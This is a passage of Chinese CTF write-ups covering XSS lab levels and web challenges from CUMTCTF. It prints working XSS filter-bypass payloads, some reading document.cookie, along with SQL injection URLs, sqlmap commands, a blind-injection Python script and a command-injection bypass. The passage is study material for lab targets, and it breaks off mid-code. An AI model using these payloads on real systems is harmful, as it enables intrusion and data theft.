href=jav%61script:alert(1)&gt;click4&lt;/a&gt;</code></li></ol><p>第一种写法无法实现弹窗，因为HTML和url都无法识别unicode编码，只有JS可以解码，但是在JS解释之前alert的e是被编码的状态，JS不会认为该语句是可以执行的，因为有一个被编码的字符e，如果此时修改为<code>alert(&#39;\u65&#39;)</code>就可以被成功执行</p><p>第二种写法可以实现弹窗，因为url解码是在js解码之前的，所以在JS执行之前已经得到完整的JS代码了，所以可以执行</p><p>第三种写法自然也可以实现弹窗，因为HMLT解码更早，在url解码之前，所以自然能够执行</p><p>第四种写法无法执行，因为在url识别阶段，解码得到的javascript，此时自然不会将JavaScript看做是伪协议，所以跳转链接会产生错误，可以与第二种写法进行比对</p><blockquote><p>回到第8题，我们也就可以理解了，如果我们将<code>javacript</code>全部进行html实体编码，显然也是可以执行成功的，但是进行url编码则无法成功，与上面第4个例子的原理是一样的</p></blockquote><hr><h1 id="XSS-9"><a href="#XSS-9" class="headerlink" title="XSS-9"></a>XSS-9</h1><p>测试可知依然存在上述的编码绕过问题，但是本题加入了一个链接检测，如果链接不合法就会被拦截，经过测试发现只要链接中出现<code>http://</code>就会被判定为合法链接，之后我们再用注释将这段字符注释掉即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level9.php?keyword&#x3D;java&amp;#115cript:alert()&#x2F;*http:&#x2F;&#x2F;*&#x2F;</span><br></pre></td></tr></table></figure><p>查看代码可以看到过滤果然就是我们猜测的内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br></pre></td></tr></table></figure></p><h1 id="XSS-10"><a href="#XSS-10" class="headerlink" title="XSS-10"></a>XSS-10</h1><p>本题主要考察隐藏元素的寻找，因为本题不在是前面题目用keyword的内容来替代，查看源代码可知有一个新表单存在三个参数，因为类型是<code>hidden</code>所以看不到，测试发现第三个参数是有效参数，而且只过滤了<code>&lt;&gt;</code>两个符号，所以我们用之前的payload即可，在设置<code>type=text</code>使其可见</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level10.php?keyword&#x3D;aaa&amp;t_link&#x3D;addd&amp;t_history&#x3D;ffads&amp;t_sort&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text</span><br></pre></td></tr></table></figure><h1 id="XSS-11"><a href="#XSS-11" class="headerlink" title="XSS-11"></a>XSS-11</h1><p>题目中的t_sort字段过滤比较严格，无法绕过，但是题目在访问的时候消息头中会存在<code>Referer</code>字段，该字段存在注入的问题</p><p><img src="/2019/03/02/xss20/3.png" alt></p><p><img src="/2019/03/02/xss20/4.png" alt></p><p>测试<code>&lt;&gt;script&#39;&quot;</code>，发现<code>&lt;&gt;</code>被过滤了，其余正常，所以payload就很简单了，和前面一样，只是位置变了而已</p><p><img src="/2019/03/02/xss20/6.png" alt></p><h1 id="XSS-12"><a href="#XSS-12" class="headerlink" title="XSS-12"></a>XSS-12</h1><p>和上体基本一样，只不过本题是UA头的xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text</span><br></pre></td></tr></table></figure><h1 id="XSS-13"><a href="#XSS-13" class="headerlink" title="XSS-13"></a>XSS-13</h1><p>cookie的xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text;</span><br></pre></td></tr></table></figure><h1 id="XSS-14"><a href="#XSS-14" class="headerlink" title="XSS-14"></a>XSS-14</h1><p>这关环境有问题，网站访问不了，好像是一个图片型xss</p><h1 id="XSS-15"><a href="#XSS-15" class="headerlink" title="XSS-15"></a>XSS-15</h1><p>ng-include 题目好像有点问题</p><h1 id="XSS-16"><a href="#XSS-16" class="headerlink" title="XSS-16"></a>XSS-16</h1><p>本题过滤的挺多的，过滤了<code>script</code>、<code>空格</code>、<code>/</code>，只要没过滤尖括号就万事好说，空格我们可以用<code>%0a</code>绕过，payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level16.php?keyword&#x3D;&lt;input%0Aonclick&#x3D;&quot;window.alert()&quot;&gt;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level16.php?keyword&#x3D;&lt;image%0Asrc&#x3D;1%0aonerror&#x3D;&quot;alert()&quot;&gt;</span><br></pre></td></tr></table></figure></p><h1 id="XSS-17"><a href="#XSS-17" class="headerlink" title="XSS-17"></a>XSS-17</h1><p>本题有两个参数arg01和arg02，虽然还有flash，但是这道题和flash没关系，别被迷惑，测试一下输出点在哪个参数，发现arg02上有输出，<code>&lt;&gt;</code>、<code>&quot;</code>被过滤，我们可以使用onclick参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level17.php?arg01&#x3D;ffff&amp;arg02&#x3D;fff%208888%20onclick&#x3D;alert()</span><br></pre></td></tr></table></figure><h1 id="XSS-18"><a href="#XSS-18" class="headerlink" title="XSS-18"></a>XSS-18</h1><p>过滤了<code>&lt;&gt;</code> <code>&quot;</code>，感觉和17题没什么区别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level18.php?arg01&#x3D;wwww&amp;arg02&#x3D;bfff%20888%20onfocus&#x3D;alert()</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level18.php?arg01&#x3D;wwww&amp;arg02&#x3D;bfff%20888%20onclick&#x3D;alert()</span><br></pre></td></tr></table></figure><p>可能我太菜了，没get到17、18两题的考点，希望看到的师傅们和我交流一下XD</p><h1 id="XSS-19"><a href="#XSS-19" class="headerlink" title="XSS-19"></a>XSS-19</h1><p>从这关开始之后就是flash xss了，看了代码也看不懂2333，测试了一下这个payload是可以用的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level19.php?arg01&#x3D;version&amp;arg02&#x3D;%3Ca%20href&#x3D;%22javascript:alert(document.domain)%22%3Exss_by_SST%3C&#x2F;a%3E</span><br></pre></td></tr></table></figure><h1 id="XSS-20"><a href="#XSS-20" class="headerlink" title="XSS-20"></a>XSS-20</h1><p>payload看不懂</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level20.php?arg01&#x3D;id&amp;arg02&#x3D;\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a&#x3D;!alert(document.cookie)&#x2F;&#x2F;%26width%26height</span><br></pre></td></tr></table></figure><p>有时间再研究吧，这个用的另一种脚本语言</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于XSS的绕过，可以采用双写，大小写，闭合标签，利用过滤不完全的漏洞来使用标签</p><blockquote><p>XSS一般利用js脚本读取用户浏览器中的Cookie，而如果在服务器端对Cookie 设置了HttpOnly 属性，那么js脚本就不能读取到cookie，但是浏览器还是能够正常使用cookie</p></blockquote><p>总的来说，对于XSS攻击，我们要对<strong>输入参数进行过滤，对输出进行编码转义，白名单和黑名单相结合。</strong></p><p><strong><em>reference:</em></strong><br><a href="https://www.cnblogs.com/escape-w/p/10162831.html" target="_blank" rel="noopener">https://www.cnblogs.com/escape-w/p/10162831.html</a><br><a href="https://blog.csdn.net/he_and/article/details/80588409" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/80588409</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近学到了xss漏洞，来做一下这个xss题目&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="XSS" scheme="http://chaosec.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF第二轮月赛</title>
    <link href="http://chaosec.top/2019/01/30/cumtctf2/"/>
    <id>http://chaosec.top/2019/01/30/cumtctf2/</id>
    <published>2019-01-30T14:50:00.000Z</published>
    <updated>2019-02-12T14:29:27.946Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。</p><a id="more"></a><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$white_list = range(<span class="number">0</span>,<span class="number">9</span>); </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver2'</span>]))&#123; </span><br><span class="line">    $a = $_REQUEST[<span class="string">'0ver'</span>]; </span><br><span class="line">    $b = $_REQUEST[<span class="string">'0ver1'</span>]; </span><br><span class="line">    $c = $_REQUEST[<span class="string">'0ver2'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(@ereg(<span class="string">"^[0-9]+$"</span>, $a) === <span class="keyword">FALSE</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'no must be number'</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($a,$white_list))&#123; </span><br><span class="line">            <span class="keyword">if</span>(strlen($a)&gt;<span class="number">1</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span>(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;img src='dark.png'&gt;&lt;br&gt;"</span>; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'you are a great dark phper&lt;br&gt;'</span>; </span><br><span class="line">                    <span class="keyword">echo</span> $flag; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span>&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"you can do it!!!"</span>; </span><br><span class="line">                &#125; </span><br><span class="line">                 </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'you no dark'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'you are so dark'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>很简单的代码审计题目，第一次绕过要求0ver是数字0-9以内的整数，但是长度却要大于1位，使用 <code>03</code>类似的即可绕过，也可以使用<code>%00</code>截断，第二层要求两个相同md5值的文件（不是弱类型比较），这样的文件也是有的，记得强网杯好像就有类似的题目，参考一下即可</p><p>paylaod：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;202.119.201.199:32790?0ver&#x3D;02 --data &quot;0ver1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;0ver2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:flag&#123;73100259ca8919f402846b00d3b939a9&#125;</span><br></pre></td></tr></table></figure><h2 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h2><p>查看源码可知发现前端验证设置了白名单，只允许上传.jpg|.png|.gif。</p><p>这里需要绕过前端验证，上传1.jpg，利用burp截断修改后缀名为1.php。</p><p><img src="https://i.imgur.com/kDxBrxT.png" alt>    </p><h2 id="小型线上赌场"><a href="#小型线上赌场" class="headerlink" title="小型线上赌场"></a>小型线上赌场</h2><p>题目提示了断电，应该是vi文件泄露，测试发现 <code>.index.swp</code>存在泄露，vim恢复一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi -r index.swp</span><br></pre></td></tr></table></figure><p>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $invest = $_GET[<span class="string">'invest'</span>];</span><br><span class="line">    $rand = rand(<span class="number">2</span>,<span class="number">50</span>);</span><br><span class="line">    $len = strlen(trim($_GET[<span class="string">'invest'</span>]));</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($value)||$value == <span class="string">'0'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'no no no!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $money = number_format($invest*$rand);</span><br><span class="line">    $money = intval(str_replace(<span class="string">','</span>,<span class="string">''</span>,$money));</span><br><span class="line">    $guess = intval($_GET[<span class="string">'guess'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($guess == $money &amp;&amp; strlen($money)===$len) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码思路是提交invest值，然后乘以一个2-50之间的随机数与我们猜测的相等即可得到flag，直接多次尝试爆破即可，即每次都提交invest值为2，guess值为6，只要某次随机数为3的时候即可得到flag</p><p><img src="https://i.loli.net/2019/01/24/5c49424c2fdc8.png" alt="抓包爆破"></p><p><img src="https://i.loli.net/2019/01/24/5c4942d3766a8.png" alt="flag"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7e1e2bfe75c980be35c61ed1bde7a6f2&#125;</span><br></pre></td></tr></table></figure><h2 id="SimpleSQLi"><a href="#SimpleSQLi" class="headerlink" title="SimpleSQLi"></a>SimpleSQLi</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure><p>数据库名为security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security --tables</span><br></pre></td></tr></table></figure><p>表名flagishere</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere --columns --threads&#x3D;10</span><br></pre></td></tr></table></figure><p>列名id,flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere -C &quot;id,flag&quot; --dump --threads&#x3D;10</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4ur0Ra_SimPlE_sQLi_23333&#125;</span><br></pre></td></tr></table></figure><h2 id="真的简单。。"><a href="#真的简单。。" class="headerlink" title="真的简单。。"></a>真的简单。。</h2><p>随手fuzz一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27</span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27--+</span><br></pre></td></tr></table></figure><p>可以正常返回，猜测是单引号注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20or%201&#x3D;1--+</span><br></pre></td></tr></table></figure><p>无正确回显，猜测可能是or有问题，换 <code>||</code> 试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;length(database())--+</span><br></pre></td></tr></table></figure><p>果然返回正确，数据库长度为3</p><p>题目过滤了or，但是可以绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20oorr%201&#x3D;1--+</span><br></pre></td></tr></table></figure><p>爆列数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;3 oorrder by 3--+</span><br></pre></td></tr></table></figure><p>共有三列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,database(),3--+</span><br></pre></td></tr></table></figure><p>database:ctf</p><p>接下来就是常规的注入了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure><p>table：ctf,flag </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure><p>列名：id,flag </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,flag,3 from flag--+</span><br></pre></td></tr></table></figure><p>居然还有题目..</p><blockquote><p>flag in admin_08163314/exec.php </p></blockquote><p>访问一下，是个命令执行界面，过滤了空格，可用<code>$IFS</code>绕过，尝试列根目录但是失败了，猜测可能是<code>/</code>被过滤了，但是 <code>* .</code>没有被过滤，可以用来读文件exec.php</p><p><img src="https://i.loli.net/2019/01/26/5c4c5df37356a.png" alt></p><p>可以得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+|\/| )/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">system($cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知道了过滤规则就好办了，接下里可以用base64编码绕过，列根目录</p><p><img src="https://i.loli.net/2019/01/26/5c4c5e68be087.png" alt></p><p><img src="https://i.loli.net/2019/01/26/5c4c5e99549bc.png" alt></p><p>注意这里的flag_3314是个目录，还得继续列目录</p><p><img src="https://i.loli.net/2019/01/26/5c4c5eea0c492.png" alt></p><p><img src="https://i.loli.net/2019/01/26/5c4c5f1453698.png" alt></p><p><img src="https://i.loli.net/2019/01/26/5c4c5f7396879.png" alt></p><p><img src="https://i.loli.net/2019/01/26/5c4c5f7398de3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3570d4d9c72a19c889140674827eeca5&#125;</span><br></pre></td></tr></table></figure><h2 id="SimpleSQLi2"><a href="#SimpleSQLi2" class="headerlink" title="SimpleSQLi2"></a>SimpleSQLi2</h2><p>fuzz测试了一下感觉是数字型注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;-1%20||%201&#x3D;1</span><br></pre></td></tr></table></figure><p>接下来测试过滤规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;2&gt;2 || length(&#39;seleselectct&#39;)&#x3D;6</span><br></pre></td></tr></table></figure><p>测试发现过滤了 <code>select,or,空格</code>，空格可用<code>/**/</code>绕过，select等可双写绕过，接下来只需要编写盲注脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words = <span class="string">"2019~"</span></span><br><span class="line">url = <span class="string">"http://bxs.cumt.edu.cn:30010/test/index.php?id="</span></span><br><span class="line">table = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># emails,flagishere,referers,uagents,users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># Id,flag</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"2&gt;2/**/||/**/ascii(substr((seselectlect/**/flag/**/from/**/flagishere),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">128</span>):</span><br><span class="line">res = requests.get(url+payload.format(j,i)).text</span><br><span class="line"><span class="keyword">if</span> words <span class="keyword">in</span> res:</span><br><span class="line">table += chr(i)</span><br><span class="line">print(table)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>可以得到flag如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4nother_SimPLE_SQLi_0rek1&#125;</span><br></pre></td></tr></table></figure><p>后来和出题人交流了一下，思路非预期2333~</p><h2 id="文件管理系统"><a href="#文件管理系统" class="headerlink" title="文件管理系统"></a>文件管理系统</h2><p>网站有主要功能是上传文件和修改、删除文件，过滤了php等相关的文件名，无法绕过，原本的我的思路是上传一个<code>xxxx.jpg</code>，然后修改文件名，通过修改文件名为 <code>xxxx.php%00.jpg</code> 或者其它方法截断后面的jpg后缀，结果尝试了各种姿势都未果，无可奈何之下扫了一波目录，结果柳暗花明，得到了源码<code>www.zip</code></p><p>核心代码如下</p><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span 